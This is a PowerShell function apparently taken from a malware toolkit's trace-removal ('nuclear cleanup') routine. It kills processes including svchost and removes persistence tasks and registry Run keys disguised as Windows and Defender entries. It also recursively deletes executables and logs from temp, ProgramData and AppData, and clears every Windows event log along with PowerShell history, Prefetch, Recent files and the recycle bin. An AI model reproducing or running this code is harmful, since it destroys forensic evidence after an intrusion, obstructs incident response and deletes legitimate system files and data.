function Invoke-NuclearCleanup {
    Write-Host "[=== NUCLEAR CLEANUP ACTIVATED ===]" -ForegroundColor Red
    Write-Host "[!] Removing ALL traces from system..." -ForegroundColor Yellow
    
    # Track cleanup operations
    $cleanupStats = @{
        Processes = 0
        Tasks = 0
        Registry = 0
        Files = 0
        Logs = 0
    }
    
    # Phase 1: Process Cleanup
    Write-Host "`n[PHASE 1] Process Termination" -ForegroundColor Green
    $targetProcesses = @("cmd", "explorerr", "runtime", "svchost", "winupdate", "system", "update")
    
    foreach ($procName in $targetProcesses) {
        try {
            $processes = Get-Process -Name $procName -ErrorAction SilentlyContinue
            foreach ($process in $processes) {
                try {
                    $process.Kill()
                    Start-Sleep -Milliseconds 100
                    if ($process.HasExited) {
                        $cleanupStats.Processes++
                        Write-Host "[✓] Process terminated: $($process.ProcessName)" -ForegroundColor Green
                    }
                } catch {}
            }
        } catch {}
    }
    
    # Phase 2: Persistence Removal
    Write-Host "`n[PHASE 2] Persistence Removal" -ForegroundColor Green
    
    # Remove scheduled tasks
    $taskNames = @(
        "\Microsoft\Windows\SystemDataUpdater",
        "\Microsoft\Windows\DiskFootprint\Diagnosis",
        "\Microsoft\Windows\MemoryDiagnostic\Schedule"
    )
    
    foreach ($taskName in $taskNames) {
        try {
            if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
                $cleanupStats.Tasks++
                Write-Host "[✓] Task removed: $taskName" -ForegroundColor Green
            }
        } catch {}
    }
    
    # Remove registry entries
    $regEntries = @(
        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="WindowsSystemUpdate"},
        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="WindowsDefender"},
        @{Path="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; Name="WindowsSystemUpdate"}
    )
    
    foreach ($regEntry in $regEntries) {
        try {
            Remove-ItemProperty -Path $regEntry.Path -Name $regEntry.Name -ErrorAction SilentlyContinue
            $cleanupStats.Registry++
            Write-Host "[✓] Registry removed: $($regEntry.Path)\$($regEntry.Name)" -ForegroundColor Green
        } catch {}
    }
    
    # Phase 3: File System Cleanup
    Write-Host "`n[PHASE 3] File System Cleanup" -ForegroundColor Green
    
    $cleanLocations = @(
        $env:temp,
        "$env:windir\Temp",
        "$env:programdata",
        "$env:appdata"
    )
    
    $filePatterns = @("*.exe", "*.tmp", "*.log", "winupdate_*", "sysupdate_*", "runtime*", "svchost*")
    
    foreach ($location in $cleanLocations) {
        try {
            if (Test-Path $location) {
                foreach ($pattern in $filePatterns) {
                    Get-ChildItem -Path $location -Filter $pattern -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                        try {
                            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                            $cleanupStats.Files++
                            Write-Host "[✓] File removed: $($_.Name)" -ForegroundColor Green
                        } catch {}
                    }
                }
            }
        } catch {}
    }
    
    # Phase 4: Logs & History Cleanup
    Write-Host "`n[PHASE 4] Logs & History Cleanup" -ForegroundColor Green
    
    # Clear PowerShell history
    try {
        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        Clear-History -ErrorAction SilentlyContinue
        $cleanupStats.Logs++
        Write-Host "[✓] PowerShell history cleared" -ForegroundColor Green
    } catch {}
    
    # Clear recent files
    try {
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
        $cleanupStats.Logs++
        Write-Host "[✓] Recent files cleared" -ForegroundColor Green
    } catch {}
    
    # Clear event logs
    try {
        wevtutil el | ForEach-Object { 
            try { 
                wevtutil cl $_ 2>$null
                $cleanupStats.Logs++
            } catch {} 
        }
        Write-Host "[✓] Event logs cleared" -ForegroundColor Green
    } catch {}
    
    # Clear prefetch
    try {
        Remove-Item "$env:windir\Prefetch\*" -Force -ErrorAction SilentlyContinue
        Write-Host "[✓] Prefetch cleared" -ForegroundColor Green
    } catch {}
    
    # Clear recycle bin
    try {
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
        Write-Host "[✓] Recycle bin cleared" -ForegroundColor Green
    } catch {}
    
    # Summary
    Write-Host "`n[=== NUCLEAR CLEANUP COMPLETE ===]" -ForegroundColor Green
    Write-Host "[✓] Processes terminated: $($cleanupStats.Processes)" -ForegroundColor Green
    Write-Host "[✓] Tasks removed: $($cleanupStats.Tasks)" -ForegroundColor Green
    Write-Host "[✓] Registry entries removed: $($cleanupStats.Registry)" -ForegroundColor Green
    Write-Host "[✓] Files deleted: $($cleanupStats.Files)" -ForegroundColor Green
    Write-Host "[✓] Logs cleared: $($cleanupStats.Logs)" -ForegroundColor Green
    Write-Host "[✓] System returned to clean state" -ForegroundColor Green
}
